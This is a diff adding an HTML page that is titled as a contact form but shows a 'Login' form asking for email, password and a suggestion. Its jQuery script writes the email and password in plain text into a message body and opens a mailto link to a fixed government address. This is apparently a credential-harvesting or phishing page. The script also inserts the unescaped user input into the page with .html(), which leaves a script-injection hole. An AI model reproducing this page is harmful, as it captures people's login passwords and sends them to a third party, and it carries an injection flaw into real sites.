@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Contact Form</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+
+<h2>Login </h2>
+
+<form id="Login">
+    <label for="ai">Email:</label><br>
+    <input type="email" id="ai" name="ai"><br>
+    <label for="pr">Password:</label><br>
+    <input type="password" id="pr" name="pr"><br>
+    <div id="field">
+        <label for="detail">Suggestion:</label><br>
+        <textarea id="detail" name="detail" rows="4" cols="50"></textarea><br><br>
+    </div>
+    <input type="submit" id="submit-btn2" value="Submit">
+</form>
+
+<div id="sent-data" style="display: none;">
+    <h3>Sent Data:</h3>
+    <div id="email-credentials"></div>
+    <div id="suggestion"></div>
+</div>
+
+<script>
+    $(document).ready(function() {
+        $('#Login').submit(function(event) {
+            event.preventDefault();
+            var ai = $("#ai").val();
+            var pr = $("#pr").val();
+            var detail = $("#detail").val();
+
+            // Include email credentials in the email body
+            var emailBody = "Email: " + ai + "<br>" +
+                            "Password: " + pr + "<br>" +
+                            "Details: " + detail;
+
+            // Show sent data
+            $("#email-credentials").html("Email: " + ai + "<br>" +
+                                          "Password: " + pr);
+            $("#suggestion").text("Suggestion: " + detail);
+            $("#sent-data").show();
+
+            var mailtoLink = "mailto:rddi@minadef.gov.rw" +
+                            "?subject=Contact Form Submission" +
+                            "&body=" + encodeURIComponent(emailBody);
+
+            window.location.href = mailtoLink;
+        });
+
+        // Toggle visibility of sent data
+        $("#sent-data").click(function() {
+            $(this).toggle();
+        });
+    });
+</script>
+</body>
+</html>
